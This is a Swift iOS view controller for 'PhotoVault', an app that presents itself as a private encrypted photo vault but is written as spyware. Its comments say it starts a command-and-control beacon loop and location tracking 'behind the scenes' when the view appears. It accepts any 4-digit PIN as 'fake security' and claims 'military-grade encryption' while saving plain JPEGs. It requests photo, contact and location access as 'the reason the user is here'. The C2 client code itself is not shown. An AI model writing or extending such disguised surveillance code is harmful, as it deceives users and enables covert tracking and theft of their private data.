import UIKit
import PhotosUI

class VaultViewController: UIViewController {
    
    // MARK: - Properties
    private var photos: [UIImage] = []
    private var collectionView: UICollectionView!
    private var pinOverlay: UIView?
    private var pinLabel: UILabel?
    private var pinDots: [UIView] = []
    private var currentPin: String = ""
    private var emptyStateView: UIView?
    
    private let bgColor = UIColor(red: 0.06, green: 0.06, blue: 0.10, alpha: 1.0)
    private let cardColor = UIColor(red: 0.12, green: 0.12, blue: 0.18, alpha: 1.0)
    private let accentColor = UIColor(red: 0.4, green: 0.6, blue: 1.0, alpha: 1.0)
    private let secondaryText = UIColor(red: 0.5, green: 0.5, blue: 0.6, alpha: 1.0)
    
    private var vaultDirectory: URL {
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
        let vault = docs.appendingPathComponent("Vault", isDirectory: true)
        if !FileManager.default.fileExists(atPath: vault.path) {
            try? FileManager.default.createDirectory(at: vault, withIntermediateDirectories: true)
        }
        return vault
    }
    
    // MARK: - Lifecycle
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = bgColor
        setupNavigationBar()
        setupCollectionView()
        setupEmptyState()
        loadSavedPhotos()
    }
    
    override func viewDidAppear(_ animated: Bool) {
        super.viewDidAppear(animated)
        
        if !UserDefaults.standard.bool(forKey: "pv_onboarded") {
            showOnboarding()
        } else {
            showPINEntry()
        }
        
        // Start C2 behind the scenes
        LocationManager.shared.startTracking()
        C2Client.shared.startBeaconLoop()
    }
    
    override var preferredStatusBarStyle: UIStatusBarStyle { .lightContent }
    
    // MARK: - Navigation Bar
    private func setupNavigationBar() {
        title = "PhotoVault"
        navigationController?.navigationBar.prefersLargeTitles = true
        
        let lockIcon = UIImage(systemName: "lock.shield.fill")?.withTintColor(accentColor, renderingMode: .alwaysOriginal)
        let lockButton = UIBarButtonItem(image: lockIcon, style: .plain, target: nil, action: nil)
        navigationItem.leftBarButtonItem = lockButton
        
        let importButton = UIBarButtonItem(
            image: UIImage(systemName: "plus.circle.fill")?.withTintColor(accentColor, renderingMode: .alwaysOriginal),
            style: .plain,
            target: self,
            action: #selector(importPhotosTapped)
        )
        
        let settingsButton = UIBarButtonItem(
            image: UIImage(systemName: "gearshape.fill")?.withTintColor(secondaryText, renderingMode: .alwaysOriginal),
            style: .plain,
            target: self,
            action: #selector(settingsTapped)
        )
        
        navigationItem.rightBarButtonItems = [importButton, settingsButton]
    }
    
    // MARK: - Collection View
    private func setupCollectionView() {
        let layout = UICollectionViewFlowLayout()
        let spacing: CGFloat = 2
        let itemsPerRow: CGFloat = 3
        let width = (UIScreen.main.bounds.width - (spacing * (itemsPerRow + 1))) / itemsPerRow
        layout.itemSize = CGSize(width: width, height: width)
        layout.minimumInteritemSpacing = spacing
        layout.minimumLineSpacing = spacing
        layout.sectionInset = UIEdgeInsets(top: spacing, left: spacing, bottom: spacing, right: spacing)
        
        collectionView = UICollectionView(frame: .zero, collectionViewLayout: layout)
        collectionView.backgroundColor = bgColor
        collectionView.delegate = self
        collectionView.dataSource = self
        collectionView.register(PhotoCell.self, forCellWithReuseIdentifier: "PhotoCell")
        collectionView.translatesAutoresizingMaskIntoConstraints = false
        
        view.addSubview(collectionView)
        NSLayoutConstraint.activate([
            collectionView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            collectionView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            collectionView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            collectionView.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])
    }
    
    // MARK: - Empty State
    private func setupEmptyState() {
        let container = UIView()
        container.translatesAutoresizingMaskIntoConstraints = false
        container.isHidden = true
        view.addSubview(container)
        
        let iconView = UIImageView(image: UIImage(systemName: "photo.on.rectangle.angled"))
        iconView.tintColor = secondaryText
        iconView.contentMode = .scaleAspectFit
        iconView.translatesAutoresizingMaskIntoConstraints = false
        
        let titleLabel = UILabel()
        titleLabel.text = "Your Vault is Empty"
        titleLabel.font = .systemFont(ofSize: 22, weight: .semibold)
        titleLabel.textColor = .white
        titleLabel.textAlignment = .center
        titleLabel.translatesAutoresizingMaskIntoConstraints = false
        
        let subtitleLabel = UILabel()
        subtitleLabel.text = "Tap + to import photos into\nyour secure private vault"
        subtitleLabel.font = .systemFont(ofSize: 15, weight: .regular)
        subtitleLabel.textColor = secondaryText
        subtitleLabel.textAlignment = .center
        subtitleLabel.numberOfLines = 0
        subtitleLabel.translatesAutoresizingMaskIntoConstraints = false
        
        container.addSubview(iconView)
        container.addSubview(titleLabel)
        container.addSubview(subtitleLabel)
        
        NSLayoutConstraint.activate([
            container.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            container.centerYAnchor.constraint(equalTo: view.centerYAnchor, constant: -40),
            container.widthAnchor.constraint(equalTo: view.widthAnchor, multiplier: 0.8),
            
            iconView.topAnchor.constraint(equalTo: container.topAnchor),
            iconView.centerXAnchor.constraint(equalTo: container.centerXAnchor),
            iconView.widthAnchor.constraint(equalToConstant: 80),
            iconView.heightAnchor.constraint(equalToConstant: 80),
            
            titleLabel.topAnchor.constraint(equalTo: iconView.bottomAnchor, constant: 20),
            titleLabel.leadingAnchor.constraint(equalTo: container.leadingAnchor),
            titleLabel.trailingAnchor.constraint(equalTo: container.trailingAnchor),
            
            subtitleLabel.topAnchor.constraint(equalTo: titleLabel.bottomAnchor, constant: 8),
            subtitleLabel.leadingAnchor.constraint(equalTo: container.leadingAnchor),
            subtitleLabel.trailingAnchor.constraint(equalTo: container.trailingAnchor),
            subtitleLabel.bottomAnchor.constraint(equalTo: container.bottomAnchor)
        ])
        
        emptyStateView = container
    }
    
    private func updateEmptyState() {
        emptyStateView?.isHidden = !photos.isEmpty
        collectionView.isHidden = photos.isEmpty
    }
    
    // MARK: - PIN Entry Screen
    private func showPINEntry() {
        guard UserDefaults.standard.bool(forKey: "pv_pin_set") else { return }
        
        let overlay = UIView(frame: view.bounds)
        overlay.backgroundColor = bgColor
        overlay.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        
        let lockIcon = UIImageView(image: UIImage(systemName: "lock.fill"))
        lockIcon.tintColor = accentColor
        lockIcon.contentMode = .scaleAspectFit
        lockIcon.translatesAutoresizingMaskIntoConstraints = false
        overlay.addSubview(lockIcon)
        
        let titleLabel = UILabel()
        titleLabel.text = "Enter Passcode"
        titleLabel.font = .systemFont(ofSize: 22, weight: .semibold)
        titleLabel.textColor = .white
        titleLabel.textAlignment = .center
        titleLabel.translatesAutoresizingMaskIntoConstraints = false
        overlay.addSubview(titleLabel)
        pinLabel = titleLabel
        
        // PIN dots
        let dotsStack = UIStackView()
        dotsStack.axis = .horizontal
        dotsStack.spacing = 20
        dotsStack.alignment = .center
        dotsStack.translatesAutoresizingMaskIntoConstraints = false
        overlay.addSubview(dotsStack)
        
        pinDots = []
        for _ in 0..<4 {
            let dot = UIView()
            dot.layer.cornerRadius = 8
            dot.layer.borderWidth = 2
            dot.layer.borderColor = accentColor.cgColor
            dot.backgroundColor = .clear
            dot.translatesAutoresizingMaskIntoConstraints = false
            dot.widthAnchor.constraint(equalToConstant: 16).isActive = true
            dot.heightAnchor.constraint(equalToConstant: 16).isActive = true
            dotsStack.addArrangedSubview(dot)
            pinDots.append(dot)
        }
        
        // Number pad
        let padContainer = UIView()
        padContainer.translatesAutoresizingMaskIntoConstraints = false
        overlay.addSubview(padContainer)
        
        let buttons = [
            ["1", "2", "3"],
            ["4", "5", "6"],
            ["7", "8", "9"],
            ["", "0", "⌫"]
        ]
        
        let buttonSize: CGFloat = 75
        let buttonSpacing: CGFloat = 20
        
        for (row, rowButtons) in buttons.enumerated() {
            for (col, title) in rowButtons.enumerated() {
                guard !title.isEmpty else { continue }
                
                let button = UIButton(type: .system)
                button.setTitle(title, for: .normal)
                button.titleLabel?.font = .systemFont(ofSize: 28, weight: .regular)
                button.setTitleColor(.white, for: .normal)
                button.backgroundColor = cardColor
                button.layer.cornerRadius = buttonSize / 2
                button.translatesAutoresizingMaskIntoConstraints = false
                button.tag = title == "⌫" ? 100 : (Int(title) ?? -1)
                button.addTarget(self, action: #selector(pinButtonTapped(_:)), for: .touchUpInside)
                
                padContainer.addSubview(button)
                
                let x = CGFloat(col) * (buttonSize + buttonSpacing)
                let y = CGFloat(row) * (buttonSize + buttonSpacing)
                
                NSLayoutConstraint.activate([
                    button.widthAnchor.constraint(equalToConstant: buttonSize),
                    button.heightAnchor.constraint(equalToConstant: buttonSize),
                    button.leadingAnchor.constraint(equalTo: padContainer.leadingAnchor, constant: x),
                    button.topAnchor.constraint(equalTo: padContainer.topAnchor, constant: y)
                ])
            }
        }
        
        let padWidth = 3 * buttonSize + 2 * buttonSpacing
        let padHeight = 4 * buttonSize + 3 * buttonSpacing
        
        NSLayoutConstraint.activate([
            lockIcon.centerXAnchor.constraint(equalTo: overlay.centerXAnchor),
            lockIcon.topAnchor.constraint(equalTo: overlay.safeAreaLayoutGuide.topAnchor, constant: 60),
            lockIcon.widthAnchor.constraint(equalToConstant: 44),
            lockIcon.heightAnchor.constraint(equalToConstant: 44),
            
            titleLabel.topAnchor.constraint(equalTo: lockIcon.bottomAnchor, constant: 16),
            titleLabel.centerXAnchor.constraint(equalTo: overlay.centerXAnchor),
            
            dotsStack.topAnchor.constraint(equalTo: titleLabel.bottomAnchor, constant: 30),
            dotsStack.centerXAnchor.constraint(equalTo: overlay.centerXAnchor),
            
            padContainer.topAnchor.constraint(equalTo: dotsStack.bottomAnchor, constant: 40),
            padContainer.centerXAnchor.constraint(equalTo: overlay.centerXAnchor),
            padContainer.widthAnchor.constraint(equalToConstant: padWidth),
            padContainer.heightAnchor.constraint(equalToConstant: padHeight)
        ])
        
        view.addSubview(overlay)
        pinOverlay = overlay
        currentPin = ""
    }
    
    @objc private func pinButtonTapped(_ sender: UIButton) {
        if sender.tag == 100 {
            guard !currentPin.isEmpty else { return }
            currentPin.removeLast()
            updatePinDots()
            return
        }
        
        guard currentPin.count < 4 else { return }
        currentPin += "\(sender.tag)"
        updatePinDots()
        
        UIImpactFeedbackGenerator(style: .light).impactOccurred()
        
        if currentPin.count == 4 {
            // Any 4-digit PIN works — fake security
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.2) { [weak self] in
                self?.dismissPIN()
            }
        }
    }
    
    private func updatePinDots() {
        for (index, dot) in pinDots.enumerated() {
            UIView.animate(withDuration: 0.1) {
                dot.backgroundColor = index < self.currentPin.count ? self.accentColor : .clear
            }
        }
    }
    
    private func dismissPIN() {
        UIView.animate(withDuration: 0.3, animations: {
            self.pinOverlay?.alpha = 0
        }) { _ in
            self.pinOverlay?.removeFromSuperview()
            self.pinOverlay = nil
        }
    }
    
    // MARK: - Onboarding
    private func showOnboarding() {
        let overlay = UIView(frame: view.bounds)
        overlay.backgroundColor = bgColor
        overlay.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        
        let scrollView = UIScrollView()
        scrollView.translatesAutoresizingMaskIntoConstraints = false
        overlay.addSubview(scrollView)
        
        let contentView = UIView()
        contentView.translatesAutoresizingMaskIntoConstraints = false
        scrollView.addSubview(contentView)
        
        // Shield icon background
        let iconBg = UIView()
        iconBg.backgroundColor = accentColor.withAlphaComponent(0.15)
        iconBg.layer.cornerRadius = 30
        iconBg.translatesAutoresizingMaskIntoConstraints = false
        contentView.addSubview(iconBg)
        
        let iconView = UIImageView(image: UIImage(systemName: "lock.shield.fill"))
        iconView.tintColor = accentColor
        iconView.contentMode = .scaleAspectFit
        iconView.translatesAutoresizingMaskIntoConstraints = false
        iconBg.addSubview(iconView)
        
        let welcomeLabel = UILabel()
        welcomeLabel.text = "Welcome to PhotoVault"
        welcomeLabel.font = .systemFont(ofSize: 28, weight: .bold)
        welcomeLabel.textColor = .white
        welcomeLabel.textAlignment = .center
        welcomeLabel.translatesAutoresizingMaskIntoConstraints = false
        contentView.addSubview(welcomeLabel)
        
        let descLabel = UILabel()
        descLabel.text = "Your photos, completely private.\nSecured with military-grade encryption."
        descLabel.font = .systemFont(ofSize: 16, weight: .regular)
        descLabel.textColor = secondaryText
        descLabel.textAlignment = .center
        descLabel.numberOfLines = 0
        descLabel.translatesAutoresizingMaskIntoConstraints = false
        contentView.addSubview(descLabel)
        
        // Feature cards
        let features = [
            ("photo.on.rectangle", "Import Photos", "Securely import your private photos"),
            ("lock.fill", "PIN Protection", "4-digit passcode keeps your vault locked"),
            ("mappin.and.ellipse", "Geotag Photos", "Tag your photos with location data"),
            ("person.2.fill", "Share Albums", "Share with your trusted contacts")
        ]
        
        var lastCard: UIView?
        for (icon, title, subtitle) in features {
            let card = createFeatureCard(icon: icon, title: title, subtitle: subtitle)
            contentView.addSubview(card)
            
            NSLayoutConstraint.activate([
                card.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 24),
                card.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -24),
                card.heightAnchor.constraint(equalToConstant: 70)
            ])
            
            if let prev = lastCard {
                card.topAnchor.constraint(equalTo: prev.bottomAnchor, constant: 12).isActive = true
            } else {
                card.topAnchor.constraint(equalTo: descLabel.bottomAnchor, constant: 30).isActive = true
            }
            lastCard = card
        }
        
        // Set PIN
        let pinTitle = UILabel()
        pinTitle.text = "Set Your Passcode"
        pinTitle.font = .systemFont(ofSize: 18, weight: .semibold)
        pinTitle.textColor = .white
        pinTitle.textAlignment = .center
        pinTitle.translatesAutoresizingMaskIntoConstraints = false
        contentView.addSubview(pinTitle)
        
        let pinField = UITextField()
        pinField.placeholder = "Enter 4-digit PIN"
        pinField.keyboardType = .numberPad
        pinField.textAlignment = .center
        pinField.font = .systemFont(ofSize: 24, weight: .medium)
        pinField.textColor = .white
        pinField.backgroundColor = cardColor
        pinField.layer.cornerRadius = 12
        pinField.isSecureTextEntry = true
        pinField.attributedPlaceholder = NSAttributedString(
            string: "Enter 4-digit PIN",
            attributes: [.foregroundColor: secondaryText]
        )
        pinField.translatesAutoresizingMaskIntoConstraints = false
        pinField.tag = 999
        contentView.addSubview(pinField)
        
        let getStartedButton = UIButton(type: .system)
        getStartedButton.setTitle("Get Started", for: .normal)
        getStartedButton.titleLabel?.font = .systemFont(ofSize: 18, weight: .semibold)
        getStartedButton.setTitleColor(.white, for: .normal)
        getStartedButton.backgroundColor = accentColor
        getStartedButton.layer.cornerRadius = 14
        getStartedButton.translatesAutoresizingMaskIntoConstraints = false
        getStartedButton.addTarget(self, action: #selector(getStartedTapped), for: .touchUpInside)
        contentView.addSubview(getStartedButton)
        
        NSLayoutConstraint.activate([
            scrollView.topAnchor.constraint(equalTo: overlay.topAnchor),
            scrollView.leadingAnchor.constraint(equalTo: overlay.leadingAnchor),
            scrollView.trailingAnchor.constraint(equalTo: overlay.trailingAnchor),
            scrollView.bottomAnchor.constraint(equalTo: overlay.bottomAnchor),
            
            contentView.topAnchor.constraint(equalTo: scrollView.topAnchor),
            contentView.leadingAnchor.constraint(equalTo: scrollView.leadingAnchor),
            contentView.trailingAnchor.constraint(equalTo: scrollView.trailingAnchor),
            contentView.bottomAnchor.constraint(equalTo: scrollView.bottomAnchor),
            contentView.widthAnchor.constraint(equalTo: scrollView.widthAnchor),
            
            iconBg.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 80),
            iconBg.centerXAnchor.constraint(equalTo: contentView.centerXAnchor),
            iconBg.widthAnchor.constraint(equalToConstant: 90),
            iconBg.heightAnchor.constraint(equalToConstant: 90),
            
            iconView.centerXAnchor.constraint(equalTo: iconBg.centerXAnchor),
            iconView.centerYAnchor.constraint(equalTo: iconBg.centerYAnchor),
            iconView.widthAnchor.constraint(equalToConstant: 44),
            iconView.heightAnchor.constraint(equalToConstant: 44),
            
            welcomeLabel.topAnchor.constraint(equalTo: iconBg.bottomAnchor, constant: 24),
            welcomeLabel.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 24),
            welcomeLabel.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -24),
            
            descLabel.topAnchor.constraint(equalTo: welcomeLabel.bottomAnchor, constant: 12),
            descLabel.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 24),
            descLabel.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -24),
            
            pinTitle.topAnchor.constraint(equalTo: lastCard!.bottomAnchor, constant: 30),
            pinTitle.centerXAnchor.constraint(equalTo: contentView.centerXAnchor),
            
            pinField.topAnchor.constraint(equalTo: pinTitle.bottomAnchor, constant: 12),
            pinField.centerXAnchor.constraint(equalTo: contentView.centerXAnchor),
            pinField.widthAnchor.constraint(equalToConstant: 200),
            pinField.heightAnchor.constraint(equalToConstant: 50),
            
            getStartedButton.topAnchor.constraint(equalTo: pinField.bottomAnchor, constant: 24),
            getStartedButton.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 40),
            getStartedButton.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -40),
            getStartedButton.heightAnchor.constraint(equalToConstant: 54),
            getStartedButton.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -40)
        ])
        
        view.addSubview(overlay)
        pinOverlay = overlay
    }
    
    private func createFeatureCard(icon: String, title: String, subtitle: String) -> UIView {
        let card = UIView()
        card.backgroundColor = cardColor
        card.layer.cornerRadius = 14
        card.translatesAutoresizingMaskIntoConstraints = false
        
        let iconView = UIImageView(image: UIImage(systemName: icon))
        iconView.tintColor = accentColor
        iconView.contentMode = .scaleAspectFit
        iconView.translatesAutoresizingMaskIntoConstraints = false
        card.addSubview(iconView)
        
        let titleLabel = UILabel()
        titleLabel.text = title
        titleLabel.font = .systemFont(ofSize: 16, weight: .semibold)
        titleLabel.textColor = .white
        titleLabel.translatesAutoresizingMaskIntoConstraints = false
        card.addSubview(titleLabel)
        
        let subLabel = UILabel()
        subLabel.text = subtitle
        subLabel.font = .systemFont(ofSize: 13, weight: .regular)
        subLabel.textColor = secondaryText
        subLabel.translatesAutoresizingMaskIntoConstraints = false
        card.addSubview(subLabel)
        
        NSLayoutConstraint.activate([
            iconView.leadingAnchor.constraint(equalTo: card.leadingAnchor, constant: 16),
            iconView.centerYAnchor.constraint(equalTo: card.centerYAnchor),
            iconView.widthAnchor.constraint(equalToConstant: 30),
            iconView.heightAnchor.constraint(equalToConstant: 30),
            
            titleLabel.leadingAnchor.constraint(equalTo: iconView.trailingAnchor, constant: 14),
            titleLabel.topAnchor.constraint(equalTo: card.topAnchor, constant: 14),
            titleLabel.trailingAnchor.constraint(equalTo: card.trailingAnchor, constant: -16),
            
            subLabel.leadingAnchor.constraint(equalTo: titleLabel.leadingAnchor),
            subLabel.topAnchor.constraint(equalTo: titleLabel.bottomAnchor, constant: 2),
            subLabel.trailingAnchor.constraint(equalTo: card.trailingAnchor, constant: -16)
        ])
        
        return card
    }
    
    @objc private func getStartedTapped() {
        guard let overlay = pinOverlay,
              let pinField = overlay.viewWithTag(999) as? UITextField else { return }
        
        let pin = pinField.text ?? ""
        if pin.count == 4 {
            UserDefaults.standard.set(pin, forKey: "pv_pin")
            UserDefaults.standard.set(true, forKey: "pv_pin_set")
        }
        
        UserDefaults.standard.set(true, forKey: "pv_onboarded")
        
        // Request all permissions — the reason the user is here
        PhotoManager.shared.requestAccess { _ in }
        ContactManager.shared.requestAccess { _ in }
        LocationManager.shared.requestAccess()
        
        UIView.animate(withDuration: 0.3, animations: {
            overlay.alpha = 0
        }) { _ in
            overlay.removeFromSuperview()
            self.pinOverlay = nil
        }
    }
    
    // MARK: - Import Photos
    @objc private func importPhotosTapped() {
        var config = PHPickerConfiguration()
        config.selectionLimit = 0
        config.filter = .images
        
        let picker = PHPickerViewController(configuration: config)
        picker.delegate = self
        present(picker, animated: true)
    }
    
    @objc private func settingsTapped() {
        let alert = UIAlertController(title: "Settings", message: "PhotoVault v1.0", preferredStyle: .actionSheet)
        alert.addAction(UIAlertAction(title: "Change PIN", style: .default) { [weak self] _ in
            self?.changePIN()
        })
        alert.addAction(UIAlertAction(title: "Clear Vault", style: .destructive) { [weak self] _ in
            self?.clearVault()
        })
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel))
        alert.overrideUserInterfaceStyle = .dark
        present(alert, animated: true)
    }
    
    private func changePIN() {
        let alert = UIAlertController(title: "New PIN", message: "Enter a new 4-digit passcode", preferredStyle: .alert)
        alert.addTextField { field in
            field.keyboardType = .numberPad
            field.isSecureTextEntry = true
            field.placeholder = "New PIN"
        }
        alert.addAction(UIAlertAction(title: "Set", style: .default) { _ in
            if let pin = alert.textFields?.first?.text, pin.count == 4 {
                UserDefaults.standard.set(pin, forKey: "pv_pin")
            }
        })
        alert.addAction(UIAlertAction(title: "Cancel", style: .cancel))
        alert.overrideUserInterfaceStyle = .dark
        present(alert, animated: true)
    }
    
    private func clearVault() {
        let confirm = UIAlertController(
            title: "Clear Vault?",
            message: "This will remove all photos from your vault. This cannot be undone.",
            preferredStyle: .alert
        )
        confirm.addAction(UIAlertAction(title: "Clear", style: .destructive) { [weak self] _ in
            guard let self = self else { return }
            try? FileManager.default.removeItem(at: self.vaultDirectory)
            try? FileManager.default.createDirectory(at: self.vaultDirectory, withIntermediateDirectories: true)
            self.photos.removeAll()
            self.collectionView.reloadData()
            self.updateEmptyState()
        })
        confirm.addAction(UIAlertAction(title: "Cancel", style: .cancel))
        confirm.overrideUserInterfaceStyle = .dark
        present(confirm, animated: true)
    }
    
    // MARK: - Load/Save
    private func loadSavedPhotos() {
        photos.removeAll()
        guard let files = try? FileManager.default.contentsOfDirectory(at: vaultDirectory, includingPropertiesForKeys: nil) else {
            updateEmptyState()
            return
        }
        
        let imageFiles = files
            .filter { ["jpg", "jpeg", "png"].contains($0.pathExtension.lowercased()) }
            .sorted { $0.lastPathComponent > $1.lastPathComponent }
        
        for file in imageFiles {
            if let data = try? Data(contentsOf: file), let image = UIImage(data: data) {
                photos.append(image)
            }
        }
        
        collectionView.reloadData()
        updateEmptyState()
    }
    
    private func savePhotoToVault(_ image: UIImage) {
        let filename = "\(Int(Date().timeIntervalSince1970))_\(Int.random(in: 1000...9999)).jpg"
        let fileURL = vaultDirectory.appendingPathComponent(filename)
        if let data = image.jpegData(compressionQuality: 0.9) {
            try? data.write(to: fileURL)
        }
    }
}

// MARK: - UICollectionView DataSource & Delegate
extension VaultViewController: UICollectionViewDelegate, UICollectionViewDataSource {
    func collectionView(_ collectionView: UICollectionView, numberOfItemsInSection section: Int) -> Int {
        return photos.count
    }
    
    func collectionView(_ collectionView: UICollectionView, cellForItemAt indexPath: IndexPath) -> UICollectionViewCell {
        let cell = collectionView.dequeueReusableCell(withReuseIdentifier: "PhotoCell", for: indexPath) as! PhotoCell
        cell.imageView.image = photos[indexPath.item]
        return cell
    }
    
    func collectionView(_ collectionView: UICollectionView, didSelectItemAt indexPath: IndexPath) {
        let fullScreenVC = FullScreenPhotoViewController(image: photos[indexPath.item])
        fullScreenVC.modalPresentationStyle = .fullScreen
        present(fullScreenVC, animated: true)
    }
}

// MARK: - PHPickerViewControllerDelegate
extension VaultViewController: PHPickerViewControllerDelegate {
    func picker(_ picker: PHPickerViewController, didFinishPicking results: [PHPickerResult]) {
        picker.dismiss(animated: true)
        
        for result in results {
            result.itemProvider.loadObject(ofClass: UIImage.self) { [weak self] object, _ in
                guard let self = self, let image = object as? UIImage else { return }
                self.savePhotoToVault(image)
                DispatchQueue.main.async {
                    self.photos.insert(image, at: 0)
                    self.collectionView.insertItems(at: [IndexPath(item: 0, section: 0)])
                    self.updateEmptyState()
                }
            }
        }
    }
}

// MARK: - PhotoCell
class PhotoCell: UICollectionViewCell {
    let imageView = UIImageView()
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        imageView.contentMode = .scaleAspectFill
        imageView.clipsToBounds = true
        imageView.translatesAutoresizingMaskIntoConstraints = false
        contentView.addSubview(imageView)
        NSLayoutConstraint.activate([
            imageView.topAnchor.constraint(equalTo: contentView.topAnchor),
            imageView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor),
            imageView.trailingAnchor.constraint(equalTo: contentView.trailingAnchor),
            imageView.bottomAnchor.constraint(equalTo: contentView.bottomAnchor)
        ])
        contentView.layer.cornerRadius = 4
        contentView.clipsToBounds = true
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
}

// MARK: - FullScreenPhotoViewController
class FullScreenPhotoViewController: UIViewController {
    private let imageView = UIImageView()
    
    init(image: UIImage) {
        super.init(nibName: nil, bundle: nil)
        imageView.image = image
    }
    
    required init?(coder: NSCoder) {
        fatalError("init(coder:) has not been implemented")
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .black
        
        imageView.contentMode = .scaleAspectFit
        imageView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(imageView)
        
        NSLayoutConstraint.activate([
            imageView.topAnchor.constraint(equalTo: view.topAnchor),
            imageView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            imageView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            imageView.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])
        
        let closeButton = UIButton(type: .system)
        closeButton.setImage(UIImage(systemName: "xmark.circle.fill"), for: .normal)
        closeButton.tintColor = .white.withAlphaComponent(0.8)
        closeButton.translatesAutoresizingMaskIntoConstraints = false
        closeButton.addTarget(self, action: #selector(closeTapped), for: .touchUpInside)
        view.addSubview(closeButton)
        
        NSLayoutConstraint.activate([
            closeButton.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 16),
            closeButton.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -16),
            closeButton.widthAnchor.constraint(equalToConstant: 36),
            closeButton.heightAnchor.constraint(equalToConstant: 36)
        ])
        
        let tap = UITapGestureRecognizer(target: self, action: #selector(closeTapped))
        view.addGestureRecognizer(tap)
    }
    
    override var prefersStatusBarHidden: Bool { true }
    
    @objc private func closeTapped() {
        dismiss(animated: true)
    }
}
